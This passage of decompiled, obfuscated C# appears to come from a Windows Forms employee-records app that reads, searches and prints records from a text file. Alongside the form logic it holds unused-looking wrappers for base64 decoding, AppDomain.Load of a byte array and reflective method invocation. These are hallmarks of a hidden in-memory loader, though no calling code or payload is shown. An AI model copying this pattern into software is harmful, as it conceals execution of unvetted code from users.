				MainForm.smethod_25(lblLastName, MainForm.smethod_88(inputFile));
				MainForm.smethod_25(lblEmployeeNum, MainForm.smethod_88(inputFile));
				MainForm.smethod_25(lblDept, MainForm.smethod_88(inputFile));
				MainForm.smethod_25(lblTelephone, MainForm.smethod_88(inputFile));
				MainForm.smethod_25(lblExtension, MainForm.smethod_88(inputFile));
				MainForm.smethod_25(lblEmail, MainForm.smethod_88(inputFile));
			}
			else
			{
				MainForm.smethod_89("End of file.");
			}
		}
		catch (Exception exception_)
		{
			MainForm.smethod_84(exception_);
			MainForm.smethod_89("Cannot read a file");
			MainForm.smethod_85();
		}
	}

	private void mnuFileOpen_Click(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Invalid comparison between Unknown and I4
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			OpenFileDialog openFileDialog = OpenFileDialog1;
			MainForm.smethod_91((FileDialog)(object)openFileDialog, MainForm.smethod_90());
			MainForm.smethod_31((FileDialog)(object)openFileDialog, "employee.txt");
			MainForm.smethod_92((FileDialog)(object)openFileDialog, "Select File");
			DialogResult val = MainForm.smethod_93((CommonDialog)(object)openFileDialog);
			openFileDialog = null;
			if ((int)val != 2)
			{
				strFilePath = MainForm.smethod_94((FileDialog)(object)OpenFileDialog1);
				inputFile = MainForm.smethod_95(strFilePath);
				populateDataToArray();
			}
			else
			{
				MainForm.smethod_83((Form)(object)this);
			}
		}
		catch (Exception exception_)
		{
			MainForm.smethod_84(exception_);
			MainForm.smethod_89("File cannot be opened");
			MainForm.smethod_83((Form)(object)this);
			MainForm.smethod_85();
		}
	}

	private void AddRecordToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Invalid comparison between Unknown and I4
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		if (MainForm.smethod_75(strFilePath, "", bool_0: false) == 0 && (int)MainForm.smethod_93((CommonDialog)(object)SaveFileDialog1) == 1)
		{
			strFilePath = MainForm.smethod_94((FileDialog)(object)SaveFileDialog1);
			inputFile = MainForm.smethod_95(strFilePath);
		}
		MainForm.smethod_82(inputFile);
		WriteDataForm form_ = new WriteDataForm();
		MainForm.smethod_96((Form)(object)form_);
	}

	private void PrintToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MainForm.smethod_97(PrintPreviewDialog1, PrintDocument1);
		MainForm.smethod_96((Form)(object)PrintPreviewDialog1);
	}

	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		MainForm.smethod_83((Form)(object)this);
	}

	private void PrintDocument1_PrintPage(object sender, PrintPageEventArgs e)
	{
		Font font_ = MainForm.smethod_98("Arial", 14f, (FontStyle)1);
		Font font_2 = MainForm.smethod_99("Arial", 12f);
		float num = MainForm.smethod_100(font_2) + 2f;
		float float_ = MainForm.smethod_101(e).Left;
		float num2 = MainForm.smethod_101(e).Top;
		string string_ = "Employee Data";
		MainForm.smethod_104(MainForm.smethod_102(e), string_, font_, MainForm.smethod_103(), float_, num2);
		num2 += num;
		num2 += num;
		string_ = MainForm.smethod_106("First Name: ", MainForm.smethod_105(lblFirstName), "\r\n");
		string_ = MainForm.smethod_107(string_, "Middle Name: ", MainForm.smethod_105(lblMiddleName), "\r\n");
		string_ = MainForm.smethod_107(string_, "Last Name: ", MainForm.smethod_105(lblLastName), "\r\n");
		string_ = MainForm.smethod_107(string_, "Employee Number: ", MainForm.smethod_105(lblEmployeeNum), "\r\n");
		string_ = MainForm.smethod_107(string_, "Department: ", MainForm.smethod_105(lblDept), "\r\n");
		string_ = MainForm.smethod_107(string_, "Telephone: ", MainForm.smethod_105(lblTelephone), "\r\n");
		string_ = MainForm.smethod_107(string_, "Estension: ", MainForm.smethod_105(lblExtension), "\r\n");
		string_ = MainForm.smethod_107(string_, "E-mail Address: ", MainForm.smethod_105(lblEmail), "\r\n");
		MainForm.smethod_104(MainForm.smethod_102(e), string_, font_2, MainForm.smethod_103(), float_, num2);
	}

	public void populateDataToArray()
	{
		//IL_018c: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				inputFile = MainForm.smethod_95(strFilePath);
				numberRecord = 0;
				while (!MainForm.smethod_109(inputFile))
				{
					if (numberRecord > maxRecord)
					{
						increaseArraySize();
					}
					emplyoeeData[numberRecord].firstName = MainForm.smethod_88(inputFile);
					emplyoeeData[numberRecord].midName = MainForm.smethod_88(inputFile);
					emplyoeeData[numberRecord].lastName = MainForm.smethod_88(inputFile);
					emplyoeeData[numberRecord].employeeNumber = MainForm.smethod_108(MainForm.smethod_88(inputFile));
					emplyoeeData[numberRecord].department = MainForm.smethod_88(inputFile);
					emplyoeeData[numberRecord].telephone = MainForm.smethod_88(inputFile);
					emplyoeeData[numberRecord].ext = MainForm.smethod_88(inputFile);
					emplyoeeData[numberRecord].email = MainForm.smethod_88(inputFile);
					numberRecord++;
				}
				MainForm.smethod_82(inputFile);
				inputFile = MainForm.smethod_95(strFilePath);
			}
			catch (Exception exception_)
			{
				MainForm.smethod_84(exception_);
				MainForm.smethod_89("Cannot read a file");
				MainForm.smethod_85();
			}
		}
	}

	private void increaseArraySize()
	{
		checked
		{
			maxRecord += 10;
			ref EmployeeData[] reference = ref emplyoeeData;
			reference = (EmployeeData[])MainForm.smethod_110((Array)reference, (Array)new EmployeeData[maxRecord + 1]);
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			short num = (short)(numberRecord - 1);
			for (short num2 = 0; num2 <= num; num2 = (short)unchecked(num2 + 1))
			{
				string string_ = "";
				string_ = MainForm.smethod_106(string_, "record#", MainForm.smethod_111(unchecked((int)num2)));
				string_ = MainForm.smethod_106(string_, emplyoeeData[num2].firstName, " ");
				string_ = MainForm.smethod_106(string_, emplyoeeData[num2].midName, " ");
				string_ = MainForm.smethod_106(string_, emplyoeeData[num2].lastName, " ");
				string_ = MainForm.smethod_106(string_, MainForm.smethod_112(emplyoeeData[num2].employeeNumber), " ");
				MainForm.smethod_89(string_);
			}
		}
	}

	private void SearchToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		string string_ = MainForm.smethod_113("Input Employee ID", "", "", -1, -1);
		bool flag = false;
		checked
		{
			short num = (short)(numberRecord - 1);
			for (short num2 = 0; num2 <= num; num2 = (short)unchecked(num2 + 1))
			{
				if ((double)emplyoeeData[num2].employeeNumber == MainForm.smethod_114(string_))
				{
					MainForm.smethod_25(lblFirstName, emplyoeeData[num2].firstName);
					MainForm.smethod_25(lblMiddleName, emplyoeeData[num2].midName);
					MainForm.smethod_25(lblLastName, emplyoeeData[num2].lastName);
					MainForm.smethod_25(lblEmployeeNum, MainForm.smethod_112(emplyoeeData[num2].employeeNumber));
					MainForm.smethod_25(lblDept, emplyoeeData[num2].department);
					MainForm.smethod_25(lblTelephone, emplyoeeData[num2].telephone);
					MainForm.smethod_25(lblExtension, emplyoeeData[num2].ext);
					MainForm.smethod_25(lblEmail, emplyoeeData[num2].email);
					flag = true;
				}
			}
			if (!flag)
			{
				MainForm.smethod_89("No record is found");
			}
		}
	}

	private void AboutToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	static void smethod_0(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Type smethod_1(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static ComponentResourceManager smethod_2(Type type_0)
	{
		return new ComponentResourceManager(type_0);
	}

	static Button smethod_3()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static Label smethod_4()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static GroupBox smethod_5()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new GroupBox();
	}

	static OpenFileDialog smethod_6()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new OpenFileDialog();
	}

	static MenuStrip smethod_7()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new MenuStrip();
	}

	static ToolStripMenuItem smethod_8()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripMenuItem();
	}

	static ToolStripSeparator smethod_9()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripSeparator();
	}

	static SaveFileDialog smethod_10()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new SaveFileDialog();
	}

	static PrintDocument smethod_11()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PrintDocument();
	}

	static PrintPreviewDialog smethod_12()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PrintPreviewDialog();
	}

	static void smethod_13(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_14(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_15(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_16(Control control_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Margin(padding_0);
	}

	static void smethod_17(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_18(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_19(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_20(ButtonBase buttonBase_0, string string_0)
	{
		buttonBase_0.set_Text(string_0);
	}

	static void smethod_21(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_22(Label label_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		label_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_23(Label label_0, ContentAlignment contentAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		label_0.set_TextAlign(contentAlignment_0);
	}

	static void smethod_24(Label label_0, bool bool_0)
	{
		label_0.set_AutoSize(bool_0);
	}

	static void smethod_25(Label label_0, string string_0)
	{
		label_0.set_Text(string_0);
	}

	static ControlCollection smethod_26(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_27(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_28(Control control_0, Padding padding_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Padding(padding_0);
	}

	static void smethod_29(GroupBox groupBox_0, bool bool_0)
	{
		groupBox_0.set_TabStop(bool_0);
	}

	static void smethod_30(GroupBox groupBox_0, string string_0)
	{
		groupBox_0.set_Text(string_0);
	}

	static void smethod_31(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.set_FileName(string_0);
	}

	static void smethod_32(ToolStrip toolStrip_0, Size size_0)
	{
		toolStrip_0.set_ImageScalingSize(size_0);
	}

	static ToolStripItemCollection smethod_33(ToolStrip toolStrip_0)
	{
		return toolStrip_0.get_Items();
	}

	static void smethod_34(ToolStripItemCollection toolStripItemCollection_0, ToolStripItem[] toolStripItem_0)
	{
		toolStripItemCollection_0.AddRange(toolStripItem_0);
	}

	static void smethod_35(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static ToolStripItemCollection smethod_36(ToolStripDropDownItem toolStripDropDownItem_0)
	{
		return toolStripDropDownItem_0.get_DropDownItems();
	}

	static void smethod_37(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Name(string_0);
	}

	static void smethod_38(ToolStripItem toolStripItem_0, Size size_0)
	{
		toolStripItem_0.set_Size(size_0);
	}

	static void smethod_39(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Text(string_0);
	}

	static void smethod_40(PrintPreviewDialog printPreviewDialog_0, Size size_0)
	{
		printPreviewDialog_0.set_AutoScrollMargin(size_0);
	}

	static void smethod_41(PrintPreviewDialog printPreviewDialog_0, Size size_0)
	{
		printPreviewDialog_0.set_AutoScrollMinSize(size_0);
	}

	static void smethod_42(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static void smethod_43(PrintPreviewDialog printPreviewDialog_0, bool bool_0)
	{
		printPreviewDialog_0.set_Enabled(bool_0);
	}

	static object smethod_44(ResourceManager resourceManager_0, string string_0)
	{
		return resourceManager_0.GetObject(string_0);
	}

	static void smethod_45(PrintPreviewDialog printPreviewDialog_0, Icon icon_0)
	{
		printPreviewDialog_0.set_Icon(icon_0);
	}

	static void smethod_46(PrintPreviewDialog printPreviewDialog_0, bool bool_0)
	{
		printPreviewDialog_0.set_Visible(bool_0);
	}

	static void smethod_47(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_48(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_49(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_50(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_51(Form form_0, MenuStrip menuStrip_0)
	{
		form_0.set_MainMenuStrip(menuStrip_0);
	}

	static void smethod_52(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_53(Form form_0, string string_0)
	{
		form_0.set_Text(string_0);
	}

	static void smethod_54(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_55(Control control_0)
	{
		control_0.PerformLayout();
	}

	static void smethod_56(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_57(Control control_0)
	{
		control_0.PerformLayout();
	}

	static string smethod_58(string[] string_0)
	{
		return string.Concat(string_0);
	}

	static MethodInfo smethod_59(Type type_0, string string_0)
	{
		return type_0.GetMethod(string_0);
	}

	static object smethod_60(MethodBase methodBase_0, object object_0, object[] object_1)
	{
		return methodBase_0.Invoke(object_0, object_1);
	}

	static Type[] smethod_61(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static char smethod_62(string string_0, int int_0)
	{
		return string_0[int_0];
	}

	static string smethod_63(object object_0)
	{
		return Conversions.ToString(object_0);
	}

	static string smethod_64(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static int smethod_65(string string_0)
	{
		return string_0.Length;
	}

	static string smethod_66(string string_0)
	{
		return string_0.ToString();
	}

	static double smethod_67(double double_0)
	{
		return Math.Round(double_0);
	}

	static char smethod_68(int int_0)
	{
		return Strings.Chr(int_0);
	}

	static string smethod_69(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	static AppDomain smethod_70()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_71(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static string smethod_72(string string_0, string string_1, string string_2)
	{
		return string_0.Replace(string_1, string_2);
	}

	static char[] smethod_73(string string_0)
	{
		return string_0.ToCharArray();
	}

	static byte[] smethod_74(char[] char_0, int int_0, int int_1)
	{
		return Convert.FromBase64CharArray(char_0, int_0, int_1);
	}

	static int smethod_75(string string_0, string string_1, bool bool_0)
	{
		return Operators.CompareString(string_0, string_1, bool_0);
	}

	static void smethod_76(Control control_0, EventHandler eventHandler_0)
	{
		control_0.remove_Click(eventHandler_0);
	}

	static void smethod_77(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static void smethod_78(ToolStripItem toolStripItem_0, EventHandler eventHandler_0)
	{
		toolStripItem_0.remove_Click(eventHandler_0);
	}

	static void smethod_79(ToolStripItem toolStripItem_0, EventHandler eventHandler_0)
	{
		toolStripItem_0.add_Click(eventHandler_0);
	}

	static void smethod_80(PrintDocument printDocument_0, PrintPageEventHandler printPageEventHandler_0)
	{
		printDocument_0.remove_PrintPage(printPageEventHandler_0);
	}

	static void smethod_81(PrintDocument printDocument_0, PrintPageEventHandler printPageEventHandler_0)
	{
		printDocument_0.add_PrintPage(printPageEventHandler_0);
	}

	static void smethod_82(StreamReader streamReader_0)
	{
		streamReader_0.Close();
	}

	static void smethod_83(Form form_0)
	{
		form_0.Close();
	}

	static void smethod_84(Exception exception_0)
	{
		ProjectData.SetProjectError(exception_0);
	}

	static void smethod_85()
	{
		ProjectData.ClearProjectError();
	}

	static bool smethod_86(Control control_0)
	{
		return control_0.Focus();
	}

	static int smethod_87(StreamReader streamReader_0)
	{
		return streamReader_0.Peek();
	}

	static string smethod_88(StreamReader streamReader_0)
	{
		return streamReader_0.ReadLine();
	}

	static DialogResult smethod_89(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0);
	}

	static string smethod_90()
	{
		return Directory.GetCurrentDirectory();
	}

	static void smethod_91(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.set_InitialDirectory(string_0);
	}

	static void smethod_92(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.set_Title(string_0);
	}

	static DialogResult smethod_93(CommonDialog commonDialog_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return commonDialog_0.ShowDialog();
	}

	static string smethod_94(FileDialog fileDialog_0)
	{
		return fileDialog_0.get_FileName();
	}

	static StreamReader smethod_95(string string_0)
	{
		return File.OpenText(string_0);
	}

	static DialogResult smethod_96(Form form_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return form_0.ShowDialog();
	}

	static void smethod_97(PrintPreviewDialog printPreviewDialog_0, PrintDocument printDocument_0)
	{
		printPreviewDialog_0.set_Document(printDocument_0);
	}

	static Font smethod_98(string string_0, float float_0, FontStyle fontStyle_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0);
	}

	static Font smethod_99(string string_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Font(string_0, float_0);
	}

	static float smethod_100(Font font_0)
	{
		return font_0.GetHeight();
	}

	static Rectangle smethod_101(PrintPageEventArgs printPageEventArgs_0)
	{
		return printPageEventArgs_0.get_MarginBounds();
	}

	static Graphics smethod_102(PrintPageEventArgs printPageEventArgs_0)
	{
		return printPageEventArgs_0.get_Graphics();
	}

	static Brush smethod_103()
	{
		return Brushes.get_Black();
	}

	static void smethod_104(Graphics graphics_0, string string_0, Font font_0, Brush brush_0, float float_0, float float_1)
	{
		graphics_0.DrawString(string_0, font_0, brush_0, float_0, float_1);
	}

	static string smethod_105(Label label_0)
	{
		return label_0.get_Text();
	}

	static string smethod_106(string string_0, string string_1, string string_2)
	{
		return string_0 + string_1 + string_2;
	}

	static string smethod_107(string string_0, string string_1, string string_2, string string_3)
	{
		return string_0 + string_1 + string_2 + string_3;
	}

	static long smethod_108(string string_0)
	{
		return Conversions.ToLong(string_0);
	}

	static bool smethod_109(StreamReader streamReader_0)
	{
		return streamReader_0.EndOfStream;
	}

	static Array smethod_110(Array array_0, Array array_1)
	{
		return Utils.CopyArray(array_0, array_1);
	}

	static string smethod_111(int int_0)
	{
		return Conversions.ToString(int_0);
	}

	static string smethod_112(long long_0)
	{
		return Conversions.ToString(long_0);
	}

	static string smethod_113(string string_0, string string_1, string string_2, int int_0, int int_1)
	{
		return Interaction.InputBox(string_0, string_1, string_2, int_0, int_1);
	}

	static double smethod_114(string string_0)
	{
		return Conversions.ToDouble(string_0);
	}
}
